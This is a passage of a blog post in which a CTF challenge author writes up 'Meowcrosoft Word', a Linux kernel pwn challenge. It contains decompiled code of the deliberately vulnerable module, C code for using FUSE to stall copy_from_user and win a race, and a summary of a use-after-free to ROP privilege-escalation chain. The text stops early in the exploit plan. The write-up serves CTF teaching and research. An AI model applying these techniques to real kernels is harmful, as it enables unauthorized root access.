@@ -1,0 +1,798 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <title>Kernels and Cats</title>
+    <meta content="text/html;charset=utf-8" http-equiv="Content-Type">
+    <meta content="utf-8" http-equiv="encoding">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="format-detection" content="telephone=no" />
+    <meta name="theme-color" content="#000084" />
+    <meta name="google-site-verification" content="733C7I2uDZnatcput9zZupeQ_PX5Z0BJ1HmTnGi0SJI" />
+	<link rel="icon" href="https://kaligulaarmblessed.github.io/favicon.ico">
+    <link rel="canonical" href="https://kaligulaarmblessed.github.io">
+    
+    
+</head>
+<body>
+<nav class="navbar navbar-inverse navbar-fixed-top">
+    <div class="navbar-inner">
+        <div class="container">
+            <button type="button" class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse"></button>
+            <a class="brand" href="https://kaligulaarmblessed.github.io">Kernels and Cats</a>
+            <div class="nav-collapse collapse">
+                <ul class="nav">
+                    
+                    
+                        
+                            <li>
+                                <a href="/about/">
+                                    
+                                    <span>About</span>
+                                </a>
+                            </li>
+                        
+                    
+                        
+                            <li>
+                                <a href="/post/">
+                                    
+                                    <span>All posts</span>
+                                </a>
+                            </li>
+                        
+                    
+                </ul>
+            </div>
+        </div>
+    </div>
+</nav><div id="content" class="container">
+
+<div class="row-fluid navmargin">
+    <div class="page-header">
+        <h1>Meowcrosoft Word [STANDCON 2023] - Mon, Dec 11, 2023</h1>
+    </div>
+    <p class="lead"></p>
+    <h4 id="tldr">TLDR</h4>
+<p>Meowcrosoft Word is a kernel pwn challenge where only one allocate, one write, and one free is supposed to be possible. However, by exploiting a race condition and blocking/unblocking threads with FUSE (userfaultfd is disabled), as well as using a race condition, privilege escalation from user to root is possible. timerfd_ctx is used to leak the kernel base, msg_msg is used to leak the kernel heap, and pipe buf is used to control RIP and start off a ROP chain to call prepare_kernel_cred() and commit_creds() to get root.</p>
+<h4 id="table-of-contents">Table of Contents</h4>
+<ol>
+<li><a href="#the-story-behind-meowcrosoft-word">The Story Behind Meowcrosoft Word</a></li>
+<li><a href="#module-functionality">Module Functionality</a></li>
+<li><a href="#the-fuse-filesystem">The FUSE Filesystem</a></li>
+<li><a href="#exploitation-overview">Exploitation Overview</a></li>
+<li><a href="#setup">Setup</a></li>
+<li><a href="#triggering-the-race-condition-and-blocking">Triggering the Race Condition and Blocking</a></li>
+<li><a href="#leaking-kernel-base">Leaking Kernel Base</a></li>
+<li><a href="#leaking-the-kernel-heap-with-msg_msg">Leaking the Kernel Heap with msg_msg</a></li>
+<li><a href="#getting-a-double-free">Getting a Double Free</a></li>
+<li><a href="#rop-time">ROP Time!!!</a></li>
+</ol>
+<h4 id="the-story-behind-meowcrosoft-word">The Story Behind Meowcrosoft Word</h4>
+<p>Meowcrosoft Word was inspired by HITCON 2022&rsquo;s Fourchain Kernel (a really great writeup by Organizers can be found here: <a href="https://org.anize.rs/HITCON-2022/pwn/fourchain-kernel)">https://org.anize.rs/HITCON-2022/pwn/fourchain-kernel)</a>, as well as my time in STAR Labs, where I had to deal with FUSE. Having had to do multiple writes by synchronizing threads and blocking/unblocking them, I was like &ldquo;why not give people one single write, and force them to do it as well &gt;:3&rdquo;. However, because kernel pwn was already very cursed, and I wanted people to do it, so I had to give it a cute name, and hence Meowcrosoft Word came into existence.</p>
+<p>However, because I was busy with school and lab and OSED and stuff, and then I had to fly back home for the holidays, I only really started working on the challenge right before the CTF (sorry violenttestpen!). This led to a lot of stupid funny crap happening during the competition.</p>
+<p>On the first day of the CTF, people were saying that they wanted more pwn, so I tried to coerce (read: convince nicely) people to do Meowcrosoft Word. And so, within 1 hours and 20 minutes of the CTF starting, the challenge was blooded.</p>
+<p><img src="/flag_in_root_image.jpg" alt="Flag in root image"></p>
+<p>(Thank you GenericUser for being an Upright and Honest Citizen TM)</p>
+<p>Basically, what happened was that in my mad rush to submit the challenge, I told infra to run the root.img containing the flag on the challenge server, AND distribute the SAME root.img to the participants. So all you needed to do to get the flag was to extract the image and cat the flag 💀💀💀</p>
+<p>The challenge went down for a while, but the disaster continues. On the same day that I submitted the challenge to infra, I managed to blow up my Kali VM (where I was developing the challenge and exploit on) by using too much hard disk space, resulting in me having to revert the VM and lose a lot of my work. Fortunately most of the challenge files were on GitHub, but somehow extracting root.img into a filesystem and then recreating the image file caused some explosions, so I had to completely remake the root.img via debootstrap, installing FUSE, etc etc. This took some time, but I managed to change the flag, rebuild root.img (for the server) and dist.img (for the players), and submit them to infra. &hellip;And then infra exploded again.</p>
+<p>A few tickets were opened to tell me that the kernel challenge remote did not work, and I got a ticket from IceCreamMan telling me that because I forgot to add &ndash;monitor /dev/null to my qemu run command, it was possible to access the QEMU console 💀💀💀. We had to take the challenge down again, but hopefully since no one had a working exploit on local yet it was not too disruptive. I realized that for every connection, the QEMU command that run points to the same image, which also would not work. Some modifications were then made to copy a new root image for each new connection and use that for the QEMU command, and I submitted the new Dockerfiles and such for infra to rebuild. However, I realized that I should use a cron job to clean up all the unused images every 5 minutes to prevent the container from exploding, so I had to make yet another change and infra had to build the same stupid container for the third time in the same day. So for a while, everything was fine and dandy, and someone blooded the challenge!</p>
+<p>Then, at 2.30 am the next day, I got a ticket saying that the server hosting the kernel challenge has gone down :&quot;( I tried to SSH into the server, but I think it exploded pretty hard, so I sent a message to infra to restart it and went to sleep. Thankfully all was good the next morning and for the rest of the CTF :D (Note to self: Do not write challenges in a rush :&ldquo;3)</p>
+<h4 id="module-functionality">Module Functionality</h4>
+<p>The main functionality of the module was in ioctl_module. The module takes a structure as such via ioctl:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> req { 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> size;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> addr;
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>And can perform the following actions: create, write, read, and free.</p>
+<p>There are 3 global variables which are all initially set to 0: create_done, write_done, and free_done. When an action has been completed, the corresponding variable would be set to 1. This would mean that without doing anything weird, you would only get 1 create, 1 write, and 1 free. Just like a crappy trial version of Microsoft Word (where you can&rsquo;t actually do anything)!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    lVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">_copy_from_user</span>(<span style="color:#f92672">&amp;</span>size,param_3,<span style="color:#ae81ff">0x10</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((lVar2 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">||</span> (<span style="color:#a6e22e">_printk</span>(<span style="color:#f92672">&amp;</span>DAT_001003a2), (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x100</span> <span style="color:#f92672">&lt;</span> size)) <span style="color:#66d9ef">goto</span> LAB_001001d2;
+</span></span></code></pre></div><p>The module first checks that the received size specified in the req struct is less than 0x100; if the size is greater than 0x100, any action called will fail and immediately jump to return.</p>
+<p><strong>Create a document: 0xc010ca00</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (param_2 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xc010ca00</span>) { <span style="color:#75715e">// Create a new document
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (create_done <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            create_done <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>            doc <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)<span style="color:#a6e22e">kmalloc_trace</span>(_DAT_00101088,<span style="color:#ae81ff">0xdc0</span>,<span style="color:#ae81ff">0x20</span>); 
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">*</span>doc <span style="color:#f92672">=</span> meow_str;
+</span></span><span style="display:flex;"><span>            doc[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> size;
+</span></span><span style="display:flex;"><span>            doc[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> expiry;
+</span></span><span style="display:flex;"><span>            data_ptr <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">__kmalloc</span>(size,<span style="color:#ae81ff">0xdc0</span>);
+</span></span><span style="display:flex;"><span>            doc[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> data_ptr; <span style="color:#75715e">// Pointer to allocated region
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#a6e22e">_printk</span>(<span style="color:#f92672">&amp;</span>DAT_001003d7); <span style="color:#75715e">// &#34;Create done&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">_printk</span>(<span style="color:#f92672">&amp;</span>DAT_00100430); <span style="color:#75715e">// &#34;Unable to create any new documents&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#a6e22e">_printk</span>(<span style="color:#f92672">&amp;</span>DAT_00100458); <span style="color:#75715e">// &#34;Please buy a Meowcrosoft Word license.&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LAB_001001d2;
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>When create is called, a new document (tbh, a fancy way of saying note lol) is only created if create_done is 0. The doc object, and its data region is then allocated with the GFP_KERNEL flag. struct doc can be seen below:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> document { <span style="color:#75715e">// document object
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> meow_str; <span style="color:#75715e">// &#34;Meowcrosoft Office Products TM&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> expiry; <span style="color:#75715e">// &#34;Expires now!!&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">uint64_t</span> size; <span style="color:#75715e">// Cannot be larger than 0x100
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">uint64_t</span> data_ptr; <span style="color:#75715e">// Pointer to user information
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>};
+</span></span></code></pre></div><p>I had to include the first two pointers to two useless strings in struct document as when the struct is freed later on, an encrypted pointer is written to doc[1] (due to CONFIG_SLAB_FREELIST_HARDENED, which obfuscates freelist pointers). For the challenge to work, data_ptr needs to remain intact and cannot be overwritten by anything; if an encrypted pointer was written there it would destroy the value.</p>
+<p><strong>Write to a document: 0xc010ca01</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (doc <span style="color:#f92672">!=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)<span style="color:#ae81ff">0x0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (write_done <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (doc[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">&lt;</span> size) {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">_printk</span>(<span style="color:#f92672">&amp;</span>DAT_001003e6); <span style="color:#75715e">// &#34;Prevent BOF&#34; 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (size <span style="color:#f92672">&lt;</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x7d1</span>) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">_copy_from_user</span>(local_7e8,local_7f0);
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">__copy_overflow</span>(<span style="color:#ae81ff">2000</span>,size);
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">memcpy</span>(doc[<span style="color:#ae81ff">3</span>],local_7e8,(<span style="color:#66d9ef">size_t</span>)size);
+</span></span><span style="display:flex;"><span>                write_done <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">_printk</span>(<span style="color:#f92672">&amp;</span>DAT_001003f5); <span style="color:#75715e">// &#34;Write done&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">_printk</span>(<span style="color:#f92672">&amp;</span>DAT_001004b8); <span style="color:#75715e">// &#34;Unable to edit any more documents.&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#a6e22e">_printk</span>(<span style="color:#f92672">&amp;</span>DAT_00100458); <span style="color:#75715e">// &#34;Please buy a Meowcrosoft Word license.&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LAB_001001d2;
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>The write function first checks if write_done is equals to 0, and if it is not, the function immediately goes to return, hence allowing only one write normally. It then checks if the size is larger than the size in the document object, and if it is not, the user data is copied into the region pointed to by data_ptr in the document struct. Finally, once memcpy has been completed, write_done is set to 1. Notice that write_done is only set to 1 after copy_from_user is called; this becomes important later on.</p>
+<p><strong>Read from a document: 0xc010ca02</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (param_2 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xc010ca02</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ((doc <span style="color:#f92672">!=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)<span style="color:#ae81ff">0x0</span>) <span style="color:#f92672">&amp;&amp;</span> (size <span style="color:#f92672">&lt;=</span> doc[<span style="color:#ae81ff">2</span>])) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">memcpy</span>(local_7e8,doc[<span style="color:#ae81ff">3</span>],(<span style="color:#66d9ef">size_t</span>)size);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (data_ptr <span style="color:#f92672">&lt;</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x7d1</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">_copy_to_user</span>(local_7f0,local_7e8,data_ptr);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">__copy_overflow</span>(<span style="color:#ae81ff">2000</span>,data_ptr);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">_printk</span>(<span style="color:#f92672">&amp;</span>DAT_00100403); <span style="color:#75715e">// &#34;Read done&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">goto</span> LAB_001001d2;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>The read function first ensures that the doc object exists (to prevent null pointer dereference), and that the size to read is smaller than the size specified inside the document struct. The number of bytes specified by size is then copied to a buffer, and copy_to_user copies the data to userspace. Unlike create, write and free, an unlimited number of reads can be performed.</p>
+<p><strong>Delete a document: 0xc010ca03</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (param_2 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0xc010ca03</span>) <span style="color:#66d9ef">goto</span> LAB_001001d2;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (free_done <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">_printk</span>(<span style="color:#f92672">&amp;</span>DAT_001004e0); <span style="color:#75715e">// &#34;Unable to delete any more documents.&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#a6e22e">_printk</span>(<span style="color:#f92672">&amp;</span>DAT_00100458); <span style="color:#75715e">// &#34;Please buy a Meowcrosoft Word license.&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">goto</span> LAB_001001d2;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (doc <span style="color:#f92672">!=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)<span style="color:#ae81ff">0x0</span>) {
+</span></span><span style="display:flex;"><span>            free_done <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">kfree</span>(doc[<span style="color:#ae81ff">3</span>]);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">_printk</span>(<span style="color:#f92672">&amp;</span>DAT_00100410); <span style="color:#75715e">// &#34;Free done&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">goto</span> LAB_001001d2;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>The free function checks that free_done is equals to 0, and that the doc object exists, before setting free_done to 1 and performing a free on the data_ptr of the doc object. However, data_ptr is not zeroed out, resulting in a use-after-free.</p>
+<p>There is also a race condition vulnerability &ndash; as there are no locks involved, it is possible to write to a doc that has been freed and reallocated as a different object, allowing us to corrupt certain fields that would aid in exploitation.</p>
+<p>Userfaultfd is commonly used to block on copy_from_user, allowing for reliable race condition exploitation. However, in this challenge, as CONFIG_USERFAULTFD is not set, it would not be possible to use userfaultfd as the syscall is not implemented. Thankfully, CONFIG_FUSE_FS has been set, and fuse has been installed in root.img, allowing for control of the race condition via the FUSE filesystem.</p>
+<h4 id="the-fuse-filesystem">The FUSE Filesystem</h4>
+<p>FUSE (Filesystem in UserSpacE) is an interface that allows non-privileged users to create their own filesystems without modifying kernel code. It consists of the kernel module, fuse.ko, the userspace library, libfuse, and the mount utility, fusermount. By setting up a FUSE filesystem, you can define custom functions to perform operations such as reading and writing to files. In this case, the read operation becomes particularly important as being able to control FUSE file reads will give us the ability to block and release threads whenever we want.</p>
+<p>To define file operations and set up a FUSE filesystem, the following code can be used:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">struct</span> fuse_operations operations <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    .getattr	<span style="color:#f92672">=</span> do_getattr,
+</span></span><span style="display:flex;"><span>    .readdir	<span style="color:#f92672">=</span> do_readdir,
+</span></span><span style="display:flex;"><span>    .read	<span style="color:#f92672">=</span> do_read,
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">fuse_setup_fn</span>(<span style="color:#66d9ef">void</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> fuse_args args <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUSE_ARGS_INIT</span>(<span style="color:#ae81ff">0</span>, NULL);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> fuse_chan <span style="color:#f92672">*</span>chan;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> fuse <span style="color:#f92672">*</span>fuse;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">mkdir</span>(<span style="color:#e6db74">&#34;/tmp/fuse_dir&#34;</span>, <span style="color:#ae81ff">0777</span>)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] mkdir FUSE failed&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(chan <span style="color:#f92672">=</span> <span style="color:#a6e22e">fuse_mount</span>(<span style="color:#e6db74">&#34;/tmp/fuse_dir&#34;</span>, <span style="color:#f92672">&amp;</span>args))) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] fuse_mount failed&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>                                                                                          
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(fuse <span style="color:#f92672">=</span> <span style="color:#a6e22e">fuse_new</span>(chan, <span style="color:#f92672">&amp;</span>args, <span style="color:#f92672">&amp;</span>operations, <span style="color:#66d9ef">sizeof</span>(operations), NULL))) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fuse_unmount</span>(<span style="color:#e6db74">&#34;/tmp/fuse_dir&#34;</span>, chan);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] Setup failed&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fuse_set_signal_handlers</span>(<span style="color:#a6e22e">fuse_get_session</span>(fuse));
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fuse_loop_mt</span>(fuse);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>And in main, to make the FUSE directory and to start the filesystem:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#75715e">// Make FUSE directory
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Making FUSE directory /tmp/fuse_dir</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">mkdir</span>(<span style="color:#e6db74">&#34;/tmp/fuse_dir&#34;</span>, <span style="color:#ae81ff">0777</span>)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] mkdir FUSE failed&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Start the FUSE filesystem
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Starting FUSE filesystem</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">fork</span>()) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">dup2</span>(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">666</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fuse_main</span>(argc, argv, <span style="color:#f92672">&amp;</span>operations, NULL);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>); 
+</span></span></code></pre></div><p>You can see that filesystem operations such as getattr, readdir and read can be set to user defined functions. For instance, if I set the read operation to do_read as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">do_read</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>path, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buffer, <span style="color:#66d9ef">size_t</span> size, <span style="color:#66d9ef">off_t</span> offset, <span style="color:#66d9ef">struct</span> fuse_file_info <span style="color:#f92672">*</span>fi) {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">dprintf</span>(<span style="color:#ae81ff">666</span>, <span style="color:#e6db74">&#34;--&gt; Trying to read %s, %u, %u</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, path, offset, size);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">uint64_t</span> write1[<span style="color:#ae81ff">0x100</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>selectedText <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> signal;
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span>(path, <span style="color:#e6db74">&#34;/write1&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>	    <span style="color:#a6e22e">memset</span>(write1, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(write1));
+</span></span><span style="display:flex;"><span>	    write1[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4242424242424242</span>;
+</span></span><span style="display:flex;"><span>		selectedText <span style="color:#f92672">=</span> write1;
+</span></span><span style="display:flex;"><span>    	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">memcpy</span>(buffer, selectedText <span style="color:#f92672">+</span> offset, size);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">strlen</span>(selectedText) <span style="color:#f92672">-</span> offset;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>If the fuse directory is mapped to /tmp/fuse_dir, and you try to read from /tmp/fuse_dir/write1, you will receive &ldquo;BBBBBBBB&rdquo;. Through defining a custom read operation, we are not only able to control what can be read from the FUSE file, but also what happens when the file is read (e.g. blocking).</p>
+<h4 id="exploitation-overview">Exploitation Overview</h4>
+<p>So we know that it is possible to trigger a race condition on the kernel module, and that there is a use-after-free in the delete function, where the pointer to the data object in struct document is not zeroed out.</p>
+<p>So here is what we are going to do:</p>
+<p><img src="/meowcrosoft_word_flow.jpg" alt="Meowcrosoft Word Exploit Flow"></p>
+<ol>
+<li>Create a new document of size 0x100. The data section will be allocated in kmalloc-256.</li>
+<li>Create a new thread &ldquo;write2_thread&rdquo;.</li>
